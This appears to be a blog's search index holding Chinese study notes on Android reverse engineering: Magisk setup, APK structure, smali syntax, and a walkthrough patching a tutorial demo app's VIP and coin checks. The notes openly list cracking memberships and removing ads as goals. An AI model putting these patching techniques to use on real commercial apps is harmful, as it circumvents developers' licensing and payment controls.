[{"title":"Fuzzing_study","url":"/2023/03/08/Fuzzing-study/","content":""},{"title":"android_study_吴爱破解","url":"/2023/03/18/android-study/","content":"<p><a href=\"https://www.52pojie.cn/thread-648530-1-1.html\">《教我兄弟学Android逆向01 编写第一个Android程序》 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>\n<p><a href=\"https://www.52pojie.cn/thread-1695141-1-1.html\">https://www.52pojie.cn/thread-1695141-1-1.html</a></p>\n<p><a href=\"https://www.runoob.com/w3cnote/android-tutorial-intro.html\">1.0 Android基础入门教程 | 菜鸟教程 (runoob.com)</a></p>\n<h2 id=\"模拟器环境搭建\"><a href=\"#模拟器环境搭建\" class=\"headerlink\" title=\"模拟器环境搭建\"></a>模拟器环境搭建</h2><h3 id=\"什么是安卓逆向？\"><a href=\"#什么是安卓逆向？\" class=\"headerlink\" title=\"什么是安卓逆向？\"></a>什么是安卓逆向？</h3><p>安卓逆向是对已经打包好的APP进行反编译、源码分析了解APP实现逻辑的一门技术</p>\n<h3 id=\"安卓逆向可以干嘛？\"><a href=\"#安卓逆向可以干嘛？\" class=\"headerlink\" title=\"安卓逆向可以干嘛？\"></a>安卓逆向可以干嘛？</h3><p>去更新<br>去广告<br>内购&#x2F;会员破解<br>协议自动签到<br>白嫖！！！</p>\n<h3 id=\"Magisk介绍\"><a href=\"#Magisk介绍\" class=\"headerlink\" title=\"Magisk介绍\"></a>Magisk介绍</h3><p>参考链接：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://sspai.com/post/67932</span><br><span class=\"line\">https://magiskcn.com/</span><br><span class=\"line\">https://www.52pojie.cn/thread-1583586-1-1.html</span><br><span class=\"line\">https://magiskcn.com/lsposed-instal</span><br></pre></td></tr></table></figure>\n\n<p>Magisk 是一套用于定制 Android 的开源软件，支持高于 Android 5.0 的设备。</p>\n<p>以下是一些功能亮点：</p>\n<ul>\n<li><strong>MagiskSU</strong>：为应用程序提供 root 访问权限</li>\n<li><strong>Magisk 模块</strong>：通过安装模块修改只读分区</li>\n<li><strong>MagiskHide</strong>：从根检测 &#x2F; 系统完整性检查中隐藏 Magisk(Shamiko)</li>\n<li><strong>MagiskBoot</strong> : 最完整的安卓启动镜像解包和重新打包工具</li>\n</ul>\n<h3 id=\"学习环境搭建\"><a href=\"#学习环境搭建\" class=\"headerlink\" title=\"学习环境搭建\"></a>学习环境搭建</h3><ul>\n<li>下载雷电模拟器，开启root权限以及System.vmdk可写入</li>\n<li>拖进面具安装，安装至系统分区，出现ALL DONE安装成功</li>\n<li>安装lsposed模块</li>\n</ul>\n<h2 id=\"APK文件结构、双开、汉化、基础修改\"><a href=\"#APK文件结构、双开、汉化、基础修改\" class=\"headerlink\" title=\"APK文件结构、双开、汉化、基础修改\"></a>APK文件结构、双开、汉化、基础修改</h2><p>工具</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">教程Demo</span><br><span class=\"line\">MT管理器/NP管理器</span><br><span class=\"line\">开发者助手</span><br><span class=\"line\">雷电模拟器</span><br><span class=\"line\">核心破解器（可以按照相同包名不同签名</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Apk结构\"><a href=\"#Apk结构\" class=\"headerlink\" title=\"Apk结构\"></a>Apk结构</h3><p>apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压。</p>\n<p>解压后：</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230318203435733.png\" alt=\"image-20230318203435733\" style=\"zoom:25%;\" />\n\n\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">注释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">assets目录</td>\n<td align=\"center\">存放APK的静态资源文件，比如视频，音频，图片等</td>\n</tr>\n<tr>\n<td align=\"center\">lib 目录</td>\n<td align=\"center\">armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件</td>\n</tr>\n<tr>\n<td align=\"center\">META-INF目录</td>\n<td align=\"center\">保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改)</td>\n</tr>\n<tr>\n<td align=\"center\">res目录</td>\n<td align=\"center\">res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计</td>\n</tr>\n<tr>\n<td align=\"center\">AndroidMainfest.xml文件</td>\n<td align=\"center\">APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td>\n</tr>\n<tr>\n<td align=\"center\">classes.dex文件</td>\n<td align=\"center\">classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑</td>\n</tr>\n<tr>\n<td align=\"center\">resources.arsc文件</td>\n<td align=\"center\">resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源</td>\n</tr>\n</tbody></table>\n<h3 id=\"双开及原理\"><a href=\"#双开及原理\" class=\"headerlink\" title=\"双开及原理\"></a>双开及原理</h3><p>双开：简单来说，就是手机同时运行两个或多个相同的应用</p>\n<p>可以直接使用MT管理器修改包名</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">原理</th>\n<th align=\"center\">解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">修改包名</td>\n<td align=\"center\">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td>\n</tr>\n<tr>\n<td align=\"center\">修改Framework</td>\n<td align=\"center\">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td>\n</tr>\n<tr>\n<td align=\"center\">通过虚拟化技术实现</td>\n<td align=\"center\">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td>\n</tr>\n<tr>\n<td align=\"center\">以插件机制运行</td>\n<td align=\"center\">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>\n</tr>\n</tbody></table>\n<h3 id=\"汉化APK\"><a href=\"#汉化APK\" class=\"headerlink\" title=\"汉化APK\"></a>汉化APK</h3><p>汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p>\n<h3 id=\"AndroidManifest-xml\"><a href=\"#AndroidManifest-xml\" class=\"headerlink\" title=\"AndroidManifest.xml\"></a>AndroidManifest.xml</h3><table>\n<thead>\n<tr>\n<th align=\"center\">属性</th>\n<th align=\"center\">定义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">versionCode</td>\n<td align=\"center\">版本号，主要用来更新，例如:12</td>\n</tr>\n<tr>\n<td align=\"center\">versionName</td>\n<td align=\"center\">版本名，给用户看的，例如:1.2</td>\n</tr>\n<tr>\n<td align=\"center\">package</td>\n<td align=\"center\">包名，例如：com.zj.52pj.demo</td>\n</tr>\n<tr>\n<td align=\"center\">uses-permission android:name&#x3D;””</td>\n<td align=\"center\">应用权限，例如：android.permission.INTERNET 代表网络权限</td>\n</tr>\n<tr>\n<td align=\"center\">android:label&#x3D;”@string&#x2F;app_name”</td>\n<td align=\"center\">应用名称</td>\n</tr>\n<tr>\n<td align=\"center\">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td>\n<td align=\"center\">应用图标路径</td>\n</tr>\n<tr>\n<td align=\"center\">android:debuggable&#x3D;”true”</td>\n<td align=\"center\">应用是否开启debug权限</td>\n</tr>\n</tbody></table>\n<h3 id=\"eg\"><a href=\"#eg\" class=\"headerlink\" title=\"eg:\"></a>eg:</h3><p><a href=\"https://www.bilibili.com/video/BV1UV411i7sG/\">超详细MT管理器改包教程：教你修改包名、名称、版本、图标_哔哩哔哩_bilibili</a></p>\n<p>应用双开</p>\n<p>修改名字:<a href=\"https://www.cnblogs.com/wxy13644813114/p/13608281.html\">转载-mt管理器修改软件名称（第二课） - 王啸岩 - 博客园 (cnblogs.com)</a></p>\n<p>找个英文应用汉化</p>\n<p>替换应用的图片：在res中找文件</p>\n<h2 id=\"初识smali，vip终结者\"><a href=\"#初识smali，vip终结者\" class=\"headerlink\" title=\"初识smali，vip终结者\"></a>初识smali，vip终结者</h2><h3 id=\"目标\"><a href=\"#目标\" class=\"headerlink\" title=\"目标\"></a>目标</h3><p>了解JVM、Dalvik、ART<br>初识smali语法<br>实战修改smali</p>\n<h3 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p>教程Demo(更新)<br>MT管理器&#x2F;NP管理器<br>雷电模拟器<br>jadx-gui（开源反编译工具<br>核心破解（解决签名问题</p>\n<p>smail语法查询</p>\n<h3 id=\"JVM、Dalvik、ART\"><a href=\"#JVM、Dalvik、ART\" class=\"headerlink\" title=\"JVM、Dalvik、ART\"></a>JVM、Dalvik、ART</h3><p>JVM是JAVA虚拟机，运行JAVA字节码程序<br>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)<br>Art(Android Runtime)相当于Dalvik的升级版，本质与Dalvik无异</p>\n<h3 id=\"smali及其语法\"><a href=\"#smali及其语法\" class=\"headerlink\" title=\"smali及其语法\"></a>smali及其语法</h3><p>参考：</p>\n<p><a href=\"https://blog.csdn.net/lixpjita39/article/details/75193833\">Android逆向世界之一:smali文件_smail_逆风Lee的博客-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/l_o_s/article/details/79305253\">Smali基本语法(一)_smali注释_岳锋的博客-CSDN博客</a></p>\n<p><a href=\"https://www.chieng.cn/post/169.html\">smali语法详解（逆向安卓必学）_文摘_Chieng个人博客</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/379336005\">Smali基本语法与指令 - 知乎 (zhihu.com)</a></p>\n<p><a href=\"https://blog.csdn.net/Rozol/article/details/88368358\">https://blog.csdn.net/Rozol/article/details/88368358</a></p>\n<h4 id=\"smali文件的结构\"><a href=\"#smali文件的结构\" class=\"headerlink\" title=\"smali文件的结构\"></a>smali文件的结构</h4><h5 id=\"头文件\"><a href=\"#头文件\" class=\"headerlink\" title=\"头文件\"></a>头文件</h5><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">.class &lt;访问权限修饰符&gt; [非权限修饰符] &lt;类名&gt;</span><br><span class=\"line\">.<span class=\"built_in\">super</span> &lt;父类名&gt;</span><br><span class=\"line\">.source &lt;源文件名称&gt;</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.class public final Llutey/FTPServer/preferences/PreferencesFactory;</span><br><span class=\"line\">.super Ljava/lang/Object;</span><br><span class=\"line\">.source &quot;PreferencesFactory.java&quot;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"接口实现\"><a href=\"#接口实现\" class=\"headerlink\" title=\"接口实现\"></a>接口实现</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#interfaces</span><br><span class=\"line\">.implements &lt;接口名称&gt;</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># interfaces</span><br><span class=\"line\">.implements Landroid/view/View$OnClickListener;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"注解\"><a href=\"#注解\" class=\"headerlink\" title=\"注解\"></a>注解</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#annotations</span><br><span class=\"line\">.annotation [注解的属性] &lt;注解类名&gt;</span><br><span class=\"line\">    [注解字段=值]</span><br><span class=\"line\">    ...</span><br><span class=\"line\">.end annotation</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># annotations</span><br><span class=\"line\">.annotation build Landroid/annotation/TargetApi;</span><br><span class=\"line\">    value = 0xb</span><br><span class=\"line\">.end annotation</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"变量定义\"><a href=\"#变量定义\" class=\"headerlink\" title=\"变量定义\"></a>变量定义</h5><p>使用.field描述字段的定义，分为静态变量和普通变量两种：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#static fields</span><br><span class=\"line\">.field &lt;访问权限&gt; static [修饰词] &lt;字段名&gt;:&lt;变量类型&gt;</span><br></pre></td></tr></table></figure>\n\n<p>eg:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># static fields</span><br><span class=\"line\">.field public static mStr:Ljava/lang/String;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"常用指令1\"><a href=\"#常用指令1\" class=\"headerlink\" title=\"常用指令1\"></a>常用指令1</h4><table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">注释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">.class</td>\n<td align=\"center\">类名</td>\n</tr>\n<tr>\n<td align=\"center\">.super</td>\n<td align=\"center\">父类名，继承的上级类名名称</td>\n</tr>\n<tr>\n<td align=\"center\">.source</td>\n<td align=\"center\">源名</td>\n</tr>\n<tr>\n<td align=\"center\">.field</td>\n<td align=\"center\">变量</td>\n</tr>\n<tr>\n<td align=\"center\">.method</td>\n<td align=\"center\">方法名</td>\n</tr>\n<tr>\n<td align=\"center\">.register</td>\n<td align=\"center\">寄存器</td>\n</tr>\n<tr>\n<td align=\"center\">.end method</td>\n<td align=\"center\">方法名的结束</td>\n</tr>\n<tr>\n<td align=\"center\">public</td>\n<td align=\"center\">公有</td>\n</tr>\n<tr>\n<td align=\"center\">protected</td>\n<td align=\"center\">半公开，只有同一家人才能用</td>\n</tr>\n<tr>\n<td align=\"center\">private</td>\n<td align=\"center\">私有，只能自己使用</td>\n</tr>\n<tr>\n<td align=\"center\">.parameter</td>\n<td align=\"center\">方法参数</td>\n</tr>\n<tr>\n<td align=\"center\">.prologue</td>\n<td align=\"center\">方法开始</td>\n</tr>\n<tr>\n<td align=\"center\">.line xxx</td>\n<td align=\"center\">位于第xxx行</td>\n</tr>\n<tr>\n<td align=\"center\">.annotation&#x2F;.end annotation</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<h4 id=\"数据类型对应\"><a href=\"#数据类型对应\" class=\"headerlink\" title=\"数据类型对应\"></a>数据类型对应</h4><table>\n<thead>\n<tr>\n<th align=\"center\">smali类型</th>\n<th align=\"center\">java类型</th>\n<th align=\"center\">注释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">V</td>\n<td align=\"center\">void</td>\n<td align=\"center\">无返回值</td>\n</tr>\n<tr>\n<td align=\"center\">Z</td>\n<td align=\"center\">boolean</td>\n<td align=\"center\">布尔值类型，返回0或1</td>\n</tr>\n<tr>\n<td align=\"center\">B</td>\n<td align=\"center\">byte</td>\n<td align=\"center\">字节类型，返回字节</td>\n</tr>\n<tr>\n<td align=\"center\">S</td>\n<td align=\"center\">short</td>\n<td align=\"center\">短整数类型，返回数字</td>\n</tr>\n<tr>\n<td align=\"center\">C</td>\n<td align=\"center\">char</td>\n<td align=\"center\">字符类型，返回字符</td>\n</tr>\n<tr>\n<td align=\"center\">I</td>\n<td align=\"center\">int</td>\n<td align=\"center\">整数类型，返回数字</td>\n</tr>\n<tr>\n<td align=\"center\">J</td>\n<td align=\"center\">long （64位 需要2个寄存器存储）</td>\n<td align=\"center\">长整数类型，返回数字</td>\n</tr>\n<tr>\n<td align=\"center\">F</td>\n<td align=\"center\">float</td>\n<td align=\"center\">单浮点类型，返回数字</td>\n</tr>\n<tr>\n<td align=\"center\">D</td>\n<td align=\"center\">double （64位 需要2个寄存器存储）</td>\n<td align=\"center\">双浮点类型，返回数字</td>\n</tr>\n<tr>\n<td align=\"center\">string</td>\n<td align=\"center\">String</td>\n<td align=\"center\">文本类型，返回字符串</td>\n</tr>\n<tr>\n<td align=\"center\">Lxxx&#x2F;xxx&#x2F;xxx</td>\n<td align=\"center\">object</td>\n<td align=\"center\">对象类型，返回对象</td>\n</tr>\n</tbody></table>\n<h4 id=\"常用指令2\"><a href=\"#常用指令2\" class=\"headerlink\" title=\"常用指令2\"></a>常用指令2</h4><table>\n<thead>\n<tr>\n<th align=\"center\">关键字</th>\n<th align=\"center\">注释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">const</td>\n<td align=\"center\">重写整数属性，真假属性内容，只能是数字类型</td>\n</tr>\n<tr>\n<td align=\"center\">const-string</td>\n<td align=\"center\">重写字符串内容</td>\n</tr>\n<tr>\n<td align=\"center\">const-wide</td>\n<td align=\"center\">重写长整数类型，多用于修改到期时间。</td>\n</tr>\n<tr>\n<td align=\"center\">return</td>\n<td align=\"center\">返回指令</td>\n</tr>\n<tr>\n<td align=\"center\">if-eq</td>\n<td align=\"center\">全称equal(a&#x3D;b)，比较寄存器ab内容，相同则跳</td>\n</tr>\n<tr>\n<td align=\"center\">if-ne</td>\n<td align=\"center\">全称not equal(a!&#x3D;b)，ab内容不相同则跳</td>\n</tr>\n<tr>\n<td align=\"center\">if-eqz</td>\n<td align=\"center\">全称equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳</td>\n</tr>\n<tr>\n<td align=\"center\">if-nez</td>\n<td align=\"center\">全称not equal zero(a!&#x3D;0)，a不等于0则跳</td>\n</tr>\n<tr>\n<td align=\"center\">if-ge</td>\n<td align=\"center\">全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳</td>\n</tr>\n<tr>\n<td align=\"center\">if-le</td>\n<td align=\"center\">全称little equal(a&lt;&#x3D;b)，a小于或等于则跳</td>\n</tr>\n<tr>\n<td align=\"center\">goto</td>\n<td align=\"center\">强制跳到指定位置</td>\n</tr>\n<tr>\n<td align=\"center\">switch</td>\n<td align=\"center\">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>\n</tr>\n<tr>\n<td align=\"center\">iget</td>\n<td align=\"center\">获取寄存器数据</td>\n</tr>\n</tbody></table>\n<h4 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器:\"></a>寄存器:</h4><p>在smali里的所有操作都必须经过寄存器来进行:本地寄存器用v开头数字结尾的符号来表示，如v0、 v1、v2。 参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2。特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法）</p>\n<h3 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h3><p>本次学习使用的demo为修改一app使其能够一来就有大会员。</p>\n<h4 id=\"jadx-gui寻找目标位置\"><a href=\"#jadx-gui寻找目标位置\" class=\"headerlink\" title=\"jadx-gui寻找目标位置\"></a>jadx-gui寻找目标位置</h4><p>打开文件</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319110933178.png\" alt=\"image-20230319110933178\" style=\"zoom:67%;\" />\n\n<p>jadx-gui搜索关键字符串：大会员</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319111126434.png\" alt=\"image-20230319111126434\" style=\"zoom:50%;\" />\n\n<p>找到对应位置了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//一个私有、静态、不可变的方法   方法名</span><br><span class=\"line\">.method private static final onCreate$lambda-2(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z //(这里面是方法的参数)这里是方法返回值类型，表示布尔值类型，返回假或真</span><br><span class=\"line\">    .registers 7  //寄存器数量</span><br><span class=\"line\"></span><br><span class=\"line\">    .line 33  //代码所在的行数</span><br><span class=\"line\">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  //读取p0(第一个参数，参考寄存器知识)中element的值赋值给p0</span><br><span class=\"line\"></span><br><span class=\"line\">    const/4 p5, 0x1  //p5赋值1</span><br><span class=\"line\"></span><br><span class=\"line\">    const/16 v0, 0xa //v0赋值10，在16进制里a表示10</span><br><span class=\"line\"></span><br><span class=\"line\">    if-ge p0, v0, :cond_15  //判断p0的值是否大于或等于v0的值(即p0的值是否大于或等于10)，如果大于或等于则跳转到:cond_15</span><br><span class=\"line\"></span><br><span class=\"line\">    .line 34  //以下是常见的Toast弹窗代码</span><br><span class=\"line\">    check-cast p1, Landroid/content/Context; //检查Context对象引用</span><br><span class=\"line\"></span><br><span class=\"line\">    const-string p0, &quot;请先获取10个硬币哦&quot; //弹窗文本信息，把&quot;&quot;里的字符串数据赋值给p0</span><br><span class=\"line\"></span><br><span class=\"line\">    check-cast p0, Ljava/lang/CharSequence; //检查CharSequence对象引用</span><br><span class=\"line\"></span><br><span class=\"line\">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class=\"line\">    //将弹窗文本、显示时间等信息传给p1</span><br><span class=\"line\"></span><br><span class=\"line\">    move-result-object p0  //结果传递给p0</span><br><span class=\"line\"></span><br><span class=\"line\">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  //当看到这个Toast;-&gt;show你就应该反应过来这里是弹窗代码</span><br><span class=\"line\"></span><br><span class=\"line\">    goto :goto_31  //跳转到:goto_31</span><br><span class=\"line\"></span><br><span class=\"line\">    :cond_15 //跳转的一个地址</span><br><span class=\"line\"></span><br><span class=\"line\">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  //判断isvip方法的返回值是否为真(即结果是否为1)</span><br><span class=\"line\"></span><br><span class=\"line\">    move-result p0  //结果赋值给p0</span><br><span class=\"line\"></span><br><span class=\"line\">    if-eqz p0, :cond_43 //如果结果为0则跳转cond_43地址</span><br><span class=\"line\"></span><br><span class=\"line\">    const p0, 0x7f0d0018  //在arsc中的id索引，这个值可以进行查询</span><br><span class=\"line\"></span><br><span class=\"line\">    .line 37</span><br><span class=\"line\">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V //设置图片资源</span><br><span class=\"line\"></span><br><span class=\"line\">    const p0, 0x7f0d0008</span><br><span class=\"line\"></span><br><span class=\"line\">    .line 38</span><br><span class=\"line\">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class=\"line\"></span><br><span class=\"line\">    const p0, 0x7f0d000a</span><br><span class=\"line\"></span><br><span class=\"line\">    .line 39</span><br><span class=\"line\">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class=\"line\"></span><br><span class=\"line\">    .line 40</span><br><span class=\"line\">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class=\"line\"></span><br><span class=\"line\">    check-cast p1, Landroid/content/Context;</span><br><span class=\"line\"></span><br><span class=\"line\">    const/4 p2, 0x2 //p2赋值2</span><br><span class=\"line\"></span><br><span class=\"line\">    const-string p3, &quot;level&quot; //sp的索引</span><br><span class=\"line\"></span><br><span class=\"line\">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V //写入数据</span><br><span class=\"line\"></span><br><span class=\"line\">    goto :goto_50 //跳转地址</span><br><span class=\"line\"></span><br><span class=\"line\">    :cond_43</span><br><span class=\"line\"></span><br><span class=\"line\">    check-cast p1, Landroid/content/Context;</span><br><span class=\"line\"></span><br><span class=\"line\">    const-string p0, &quot;\\u8bf7\\u5148\\u5145\\u503c\\u5927\\u4f1a\\u5458\\u54e6\\uff01&quot; //请先充值大会员哦！</span><br><span class=\"line\"></span><br><span class=\"line\">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class=\"line\"></span><br><span class=\"line\">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class=\"line\"></span><br><span class=\"line\">    move-result-object p0</span><br><span class=\"line\"></span><br><span class=\"line\">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class=\"line\"></span><br><span class=\"line\">    :goto_50</span><br><span class=\"line\">    return p5  //返回p5的值</span><br><span class=\"line\">.end method //方法结束</span><br><span class=\"line\"></span><br><span class=\"line\">//判断是否是大会员的方法</span><br><span class=\"line\">.method public final isvip()Z</span><br><span class=\"line\">    .registers 2</span><br><span class=\"line\"></span><br><span class=\"line\">    const/4 v0, 0x0 //v0赋值0</span><br><span class=\"line\"></span><br><span class=\"line\">    return v0 //返回v0的值</span><br><span class=\"line\"></span><br><span class=\"line\">.end method</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>主要有两个判断一个硬币判断一个大会员判断，直接改就是了</p>\n<p>修改方法：修改判断、强制跳转、修改寄存器的值</p>\n<h2 id=\"恭喜你获得广告-amp-弹窗静默卡\"><a href=\"#恭喜你获得广告-amp-弹窗静默卡\" class=\"headerlink\" title=\"恭喜你获得广告&amp;弹窗静默卡\"></a>恭喜你获得广告&amp;弹窗静默卡</h2><h3 id=\"目标-1\"><a href=\"#目标-1\" class=\"headerlink\" title=\"目标\"></a>目标</h3><p>1.了解安卓四大组件、Activity生命周期<br>2.弹窗定位、去更新<br>3.广告分析与布局优化</p>\n<h3 id=\"工具-1\"><a href=\"#工具-1\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p>1.教程Demo(更新)<br>2.MT管理器&#x2F;NP管理器:activity记录<br>3.算法助手：hook弹窗<br>4.雷电模拟器<br>5.开发助手</p>\n<h3 id=\"广告类型\"><a href=\"#广告类型\" class=\"headerlink\" title=\"广告类型\"></a>广告类型</h3><p>启动广告   弹窗&amp;更新广告  横幅广告</p>\n<h3 id=\"安卓四大组件\"><a href=\"#安卓四大组件\" class=\"headerlink\" title=\"安卓四大组件\"></a>安卓四大组件</h3><table>\n<thead>\n<tr>\n<th align=\"center\">组件</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Activity(活动)</td>\n<td align=\"center\">在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表 Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td>\n</tr>\n<tr>\n<td align=\"center\">Service(服务)</td>\n<td align=\"center\">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td>\n</tr>\n<tr>\n<td align=\"center\">Broadcast Receiver(广播接收器)</td>\n<td align=\"center\">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td>\n</tr>\n<tr>\n<td align=\"center\">Content Provider(内容提供者)</td>\n<td align=\"center\">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td>\n</tr>\n</tbody></table>\n<h4 id=\"activity的切换\"><a href=\"#activity的切换\" class=\"headerlink\" title=\"activity的切换\"></a>activity的切换</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!---声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的 &lt;activity&gt; 元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。-----&gt;</span><br><span class=\"line\">&lt;activity  </span><br><span class=\"line\">    android:label=<span class=\"string\">&quot;@string/app_name&quot;</span>  </span><br><span class=\"line\">    android:name=<span class=\"string\">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span><br><span class=\"line\">    android:exported=<span class=\"string\">&quot;true&quot;</span>&gt;  &lt;!--当前Activity是否可以被另一个Application的组件启动：<span class=\"literal\">true</span>允许被启动；<span class=\"literal\">false</span>不允许被启动--&gt;</span><br><span class=\"line\">    &lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span><br><span class=\"line\">    &lt;intent-filter&gt;  </span><br><span class=\"line\">        &lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span><br><span class=\"line\">        &lt;action  </span><br><span class=\"line\">            android:name=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;  </span><br><span class=\"line\">        &lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span><br><span class=\"line\">        &lt;category  </span><br><span class=\"line\">            android:name=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;  </span><br><span class=\"line\">    &lt;/intent-filter&gt;  </span><br><span class=\"line\">&lt;/activity&gt;  </span><br><span class=\"line\">&lt;activity  